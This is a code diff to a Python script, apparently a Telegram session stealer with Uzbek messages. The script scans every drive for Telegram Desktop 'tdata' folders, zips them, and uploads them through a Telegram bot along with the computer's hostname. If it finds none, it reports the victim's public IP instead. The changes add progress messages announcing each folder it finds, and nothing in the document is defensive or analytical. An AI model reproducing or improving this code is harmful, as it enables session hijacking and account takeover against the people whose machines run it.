@@ -56,7 +56,7 @@ def zip_and_send(folder_path, zip_name_suffix):
                         file_path = os.path.join(root, file)
                         zipf.write(file_path, os.path.relpath(file_path, os.path.dirname(folder_path)))
                     except: pass
-        send_telegram_file(zip_path, f"✅ Topildi: {zip_name_suffix}\n🖥 {pc_name}")
+        send_telegram_file(zip_path, f"✅ Yangi {zip_name_suffix} yig'ildi!\n🖥 {pc_name}")
         os.remove(zip_path)
         return True
     except:
@@ -67,6 +67,7 @@ def zip_and_send(folder_path, zip_name_suffix):
 # ============================================================
 def search_and_collect():
     found = False
+    pc_name = socket.gethostname()
     
     # C: dan Z: gacha barcha mantiqiy disklarni tekshiramiz
     for drive_letter in range(ord('C'), ord('Z') + 1):
@@ -87,6 +88,7 @@ def search_and_collect():
                             ]
                             for path in possible_paths:
                                 if os.path.exists(path):
+                                    send_telegram_message(f"⏳ {pc_name}: tdata topildi! ({path}) siqilmoqda...")
                                     zip_and_send(path, "tdata")
                                     found = True
                 except:
@@ -100,13 +102,12 @@ def search_and_collect():
                 try:
                     for root, dirs, files in os.walk(drive):
                         if "Telegram" in root or "TelegramDesktop" in root:
-                            # Agar ichida tdata bo'lsa, uni ham yig'amiz
                             tdata_sub = os.path.join(root, "tdata")
                             if os.path.exists(tdata_sub):
-                                zip_and_send(tdata_sub, "tdata_alt")
+                                send_telegram_message(f"⏳ {pc_name}: tdata topildi! ({tdata_sub}) siqilmoqda...")
+                                zip_and_send(tdata_sub, "tdata")
                                 found = True
                             else:
-                                # Agar tdata bo'lmasa, o'sha papkani o'zi yig'amiz
                                 zip_and_send(root, "telegram_folder")
                                 found = True
                         if found:
@@ -124,10 +125,9 @@ def main():
     if search_and_collect():
         send_telegram_message(f"✅ {pc_name}: Barcha topilgan ma'lumotlar yuborildi!")
     else:
-        # Agar hech narsa topilmasa, kompyuter ma'lumotlarini yuboramiz
         try:
             ip = urllib.request.urlopen("https://api.ipify.org").read().decode()
-            send_telegram_message(f"📦 {pc_name}: Telegram ma'lumotlari topilmadi.\n🌐 IP: {ip}")
+            send_telegram_message(f"⚠️ {pc_name}: Telegram ma'lumotlari topilmadi!\n🌐 IP: {ip}")
         except:
             pass
 
